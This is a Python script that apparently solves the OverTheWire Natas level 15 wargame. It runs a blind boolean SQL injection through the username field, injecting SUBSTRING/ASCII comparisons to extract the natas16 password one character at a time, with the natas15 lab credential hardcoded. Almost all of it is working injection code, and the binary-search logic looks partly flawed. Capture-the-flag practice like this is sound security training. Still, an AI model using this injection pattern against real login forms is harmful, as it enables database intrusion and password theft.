# natas16" AND SUBSTRING((SELECT password FROM users WHERE username="natas16"), 1, 1)>"80

import requests

natas16_password = f''

for i in range(32):
    url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=True'
    auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

    min = 0
    max = 255
    curr = (max+min) // 2
    data = {f'username': f'natas16" AND ASCII(SUBSTRING((SELECT password FROM users WHERE username="natas16"), {i+1}, 1))={curr} AND "1"="1'}
    r = requests.post(url=url, auth=auth, data=data)

    while not (f'This user exists.' in r.text) and min < max:
        curr = (max+min) // 2

        data = {
            f'username': f'natas16" AND ASCII(SUBSTRING((SELECT password FROM users WHERE username="natas16"), {i + 1}, 1))>{curr} AND "1"="1'}
        r = requests.post(url=url, auth=auth, data=data)
        if f'This user exists.' in r.text:
            min = curr

        data = {
            f'username': f'natas16" AND ASCII(SUBSTRING((SELECT password FROM users WHERE username="natas16"), {i + 1}, 1))<{curr} AND "1"="1'}
        r = requests.post(url=url, auth=auth, data=data)
        if f'This user exists.' in r.text:
            max = curr

        data = {
            f'username': f'natas16" AND ASCII(SUBSTRING((SELECT password FROM users WHERE username="natas16"), {i+1}, 1))={curr} AND "1"="1'}
        r = requests.post(url=url, auth=auth, data=data)
        if f'This user exists.' in r.text:
            natas16_password += chr(curr)

    print(f'Natas 16 Password = {natas16_password}')
